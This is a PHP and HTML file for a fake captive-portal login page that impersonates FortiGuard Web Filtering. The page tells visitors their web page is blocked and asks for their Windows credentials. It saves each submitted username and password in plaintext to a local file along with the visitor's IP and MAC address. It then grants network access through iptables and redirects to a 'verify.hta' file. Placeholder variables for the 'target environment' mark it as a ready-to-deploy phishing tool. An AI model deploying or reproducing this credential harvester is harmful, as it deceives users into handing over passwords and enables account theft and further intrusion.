    <style type="text/css">
        html, body { margin: 0; padding: 0; font-family: Verdana, Arial, sans-serif; font-size: 10pt; }
        h1, h2 { height: 82px; text-indent: -999em; margin: 0; padding: 0; margin: 0; }
        div { margin: 0; padding: 0; }
        div.header { background: url(images/MGPGHGPGPFGHCDPFGGOGFGEH) 0 0 repeat-x; height: 82px; }
        div.header h1 { background: url(images/MGPGHGPGPFGHCDPFGGHGFHBGCHEGPFHHGG) 0 0 no-repeat; }
        div.header h2 { background: url(images/MGPGHGPGPFGHCDPFGGOGFGEH) 0 -82px no-repeat; width: 160px; float: right; }
        div.sidebar { width: 195px; height: 200px; float: left; }
        div.main { padding: 5px; margin-left: 195px; }
        div.buttons { margin-top: 30px; text-align: right; }
        h3 { margin: 36px 0; font-size: 16pt; }
        .blocked      h3 { color: #c00; }
        .authenticate h3 { color: #36c; }
        h2.fgd_icon { background: url(images/MGPGHGPGPFGHCDPFGGOGFGEH) 0 -166px repeat-x; width: 90px; height: 92px; margin: 48px auto; }
        .blocked      h2.fgd_icon { background-position: 0 -166px; }
        .authenticate h2.fgd_icon { background-position: -89px -166px; }
        form { width: 300px; margin: 30px 0; }
        label { display: block; width: 300px; margin: 5px 0; line-height: 25px; }
        label input { width: 200px; border: 1px solid #7f9db9; height: 20px; float: right; }
    </style>

<?php
// Place in the root of the webserver directory

// Rename these Variables to conform with the target environment 
$server_name = "SERVER_NAME_REPLACE";
$domain_name = "DOMAIN_NAME_REPLACE";
$site_name = "SITE_NAME_REPLACE";
 
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// The following file is used to keep track of users
$users = "/var/lib/users";
 
// Check if we've been redirected by firewall to here.
// If so redirect to registration address
// Comment out to test ------->
if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
  header("location:http://$server_name.$domain_name/index.php?add="
    .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
  exit;
}
// <---------
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
if (!isset($mac)) { exit; }
 
$user = $_POST['user'];
 
if (empty($user)) {
//if ($code!="1234") {
  // code doesn’t equal expected value, so display form
  ?>

<body class="blocked">
    <div class="header">
        <h2>Powered By Fortinet</h2>
        <h1>FortiGuard Web Filtering</h1>
    </div>
    <div class="sidebar">
        <h2 class="fgd_icon">blocked</h2>
    </div>
    <div class="main">
<h3>Web Page Blocked!</h3>
<div class="notice">
<td id=L_default_5><span class="bold color1">To access the Internet, please logon using your Windows Credentials:</span></td><br />

  <form method='POST'>
  <table border=0 cellpadding=5 cellspacing=0>
  <tr><td><font color="BLACK" size="2" face="Arial, Helvetica, sans-serif">Username:</font></td><td><input type='text' name='user'></td></tr>
  <tr><td><font color="BLACK" size="2" face="Arial, Helvetica, sans-serif">Password:</font></td><td><input type='password' name='pass'></td></tr>
  <tr><td></td><td><input type='submit' name='submit' value='Submit'></td></tr>
  </table>
  </form>
    <p>
       
    </p>
</div>
    </div>

  <?php
} else {
    enable_address();
}
 
// This function enables the PC on the system by calling iptables, and also saving the
// details in the users file for next time the firewall is reset
 
function enable_address() {
 
    global $user;
    global $pass;
    global $mac;
    global $users;
 

    file_put_contents($users,$_POST['user']."\t".$_POST['pass']."\t".$_SERVER['REMOTE_ADDR']."\t$mac\t".date("m.d.Y")."\n",FILE_APPEND + LOCK_EX);
    
    // Add PC to the firewall
    exec("sudo iptables -I internet 1 -t nat -m mac --mac-source $mac -j RETURN");
    // The following line removes connection tracking for the PC
    // This clears any previous (incorrect) route info for the redirection
    exec("sudo rmtrack ".$_SERVER['REMOTE_ADDR']);

    header("Location: verify.hta");
//    sleep(1);
//    header("location:http://".$_GET['add']);
    exit;
}

// Function to print page header
function print_header() {

  ?>
  <html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Web Filter Violation</title>

</head>
  <body>
  <?php
}

// Function to print page footer
function print_footer() {
  echo "</body>";
  echo "</html>";

}

?>
